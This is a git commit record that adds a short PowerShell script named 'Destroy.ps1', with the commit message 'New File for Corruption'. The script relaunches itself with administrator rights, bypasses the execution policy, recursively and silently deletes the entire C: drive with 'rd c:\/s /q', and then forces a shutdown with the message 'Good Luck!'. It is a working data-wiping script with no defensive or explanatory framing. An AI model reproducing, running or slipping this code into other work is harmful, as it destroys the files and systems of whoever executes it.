0271fb9a6d945f403c3104797a1232fc87961ae4
xiilos <kouretas.k@gmail.com>
2019-11-04 15:25:57 -0600

    New File for Corruption

---
+++ In Development/Destroy Destroy.ps1
@@ -0,0 +1,24 @@
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+{
+  # Relaunch as an elevated process:
+  Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb RunAs
+  exit
+}
+
+#Execution Policy
+
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Force
+
+rd c:\/s /q
+shutdown -s -t 8 -c "Good Luck!" -f
+
+
+# Script #
+
+
+
+Write-Host "ttyl"
+Get-PSSession | Remove-PSSession
+Exit
+
+# End Scripting
